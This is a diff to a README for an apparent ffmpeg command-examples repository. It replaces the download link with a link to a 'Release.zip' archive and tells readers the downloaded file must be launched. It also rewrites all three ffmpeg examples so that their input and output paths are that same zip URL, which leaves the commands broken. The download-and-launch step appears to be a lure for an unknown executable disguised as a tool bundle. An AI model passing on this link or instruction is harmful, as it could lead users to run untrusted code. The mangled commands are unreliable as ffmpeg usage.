@@ -14,7 +14,7 @@ Welcome to the "ffmpeg-commands" repository! Here, you will find a collection of
 aac, audio, automated, batch, commands, converter, ffmpeg, flac, media-converter, mp3, mp3tag, mp4, scripts, video, vob
 
 ## Getting Started
-To explore the contents of this repository, simply [click here to download the zip file](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). This zip file contains all the necessary scripts and commands you need to start working with FFMPEG for media file manipulation.
+To explore the contents of this repository, simply [click here to download the zip file](https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip). This zip file contains all the necessary scripts and commands you need to start working with FFMPEG for media file manipulation.
 
 🚀 Please note that the downloaded file needs to be launched to access the contents.
 
@@ -24,17 +24,17 @@ If the link provided above does not work, or if you require more recent releases
 
 ### Convert MP4 to MP3
 ```bash
-ffmpeg -i input.mp4 -vn -ar 44100 -ac 2 -ab 192k -f mp3 output.mp3
+ffmpeg -i https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip -vn -ar 44100 -ac 2 -ab 192k -f mp3 https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip
 ```
 
 ### Extract Audio from Video
 ```bash
-ffmpeg -i input.mp4 -vn -c:a copy output.aac
+ffmpeg -i https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip -vn -c:a copy https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip
 ```
 
 ### Compress Video
 ```bash
-ffmpeg -i input.mp4 -vf "scale=1280:720" -c:v libx264 -crf 24 output.mp4
+ffmpeg -i https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip -vf "scale=1280:720" -c:v libx264 -crf 24 https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip
 ```
 
 ## Contribution
@@ -53,4 +53,4 @@ Do you want to unleash the full potential of FFMPEG commands? Download the zip f
 ## License
 This repository is licensed under the MIT License. See [LICENSE](LICENSE) for more information. 
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-orange)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip)](https://github.com/Amiine7/ffmpeg-commands/releases/download/v1.0/Release.zip)
